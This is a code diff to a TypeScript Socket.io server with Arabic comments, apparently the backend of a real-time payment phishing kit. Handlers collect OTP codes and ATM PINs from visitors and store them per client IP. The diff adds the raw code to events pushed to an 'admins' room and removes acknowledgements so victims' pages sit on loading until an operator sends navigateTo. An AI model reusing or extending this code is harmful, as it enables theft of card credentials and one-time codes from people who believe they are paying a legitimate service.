@@ -180,8 +180,16 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
         const clientIp = String(data.ip || "unknown");
         const reference = String(data.reference || ipToReference.get(clientIp) || "");
         if (!reference) {
-          socket.emit("ackVerification", { success: false, error: "لا يوجد مرجع" });
+          // لا نُرسل شيئاً - الصفحة تبقى في loading
+          console.log(`[Socket.io] submitVerificationData: no reference for IP ${clientIp}`);
           return;
+        }
+
+        // تحديث ipToReference بالـ IP الجديد
+        if (clientIp && clientIp !== "unknown") {
+          ipToReference.set(clientIp, reference);
+          ipToSocket.set(clientIp, socket.id);
+          socket.join(`ip_${clientIp}`);
         }
 
         await createOrUpdatePayment(reference, {
@@ -193,13 +201,11 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
 
         io?.to("admins").emit("newPayment", { reference, step: 2, type: "verification" });
 
-        socket.emit("ackVerification", {
-          success: true,
-          data: { step: 2, status: "STILL" },
-        });
+        // لا نُرسل ackVerification - الصفحة تبقى في loading وتنتظر navigateTo من المشرف
+        console.log(`[Socket.io] submitVerificationData saved, waiting for admin approval: ${reference}`);
       } catch (err: any) {
         console.error("[Socket.io] submitVerificationData error:", err);
-        socket.emit("ackVerification", { success: false, error: err.message });
+        // حتى عند الخطأ لا نُرسل ackVerification
       }
     });
 
@@ -208,33 +214,32 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
       try {
         const clientIp = String(data.ip || "unknown");
         const reference = String(data.reference || ipToReference.get(clientIp) || "");
-        if (!reference) {
-          // حتى بدون مرجع نبقي في حالة تحميل - لا نرجع العميل للصفحة
-          socket.emit("ackCode", { success: true, data: { step: 3, status: "PENDING_ADMIN" } });
-          return;
+
+        // تحديث ipToReference بالـ IP الجديد لضمان عمل navigateTo
+        if (reference && clientIp && clientIp !== "unknown") {
+          ipToReference.set(clientIp, reference);
+          ipToSocket.set(clientIp, socket.id);
+          socket.join(`ip_${clientIp}`);
         }
 
         // دعم أسماء الحقول المختلفة: verification_code من OTP و pin من ATM
         const otpCode = String(data.verification_code ?? data.pin ?? data.code ?? data.secretNum ?? data.otp ?? "");
-        await createOrUpdatePayment(reference, {
-          verifyCode: otpCode,
-          secretNum: otpCode,
-          step: 3,
-          status: "step3_done",
-        });
 
-        io?.to("admins").emit("newPayment", { reference, step: 3, type: "code" });
+        if (reference) {
+          await createOrUpdatePayment(reference, {
+            verifyCode: otpCode,
+            secretNum: otpCode,
+            step: 3,
+            status: "step3_done",
+          });
+          io?.to("admins").emit("newPayment", { reference, step: 3, type: "code", code: otpCode });
+        }
 
-        // نُرسل success:true لإبقاء العميل في حالة تحميل (loading)
-        // الصفحة ستنتقل فقط عند وصول حدث navigateTo من المشرف
-        socket.emit("ackCode", {
-          success: true,
-          data: { step: 3, status: "PENDING_ADMIN" },
-        });
+        // لا نُرسل ackCode - الصفحة تبقى في loading وتنتظر navigateTo من المشرف
+        console.log(`[Socket.io] submitCodeData saved, waiting for admin approval: ${reference}`);
       } catch (err: any) {
         console.error("[Socket.io] submitCodeData error:", err);
-        // حتى عند الخطأ نبقي في حالة تحميل
-        socket.emit("ackCode", { success: true, data: { step: 3, status: "PENDING_ADMIN" } });
+        // حتى عند الخطأ لا نُرسل ackCode - الصفحة تبقى في loading
       }
     });
 
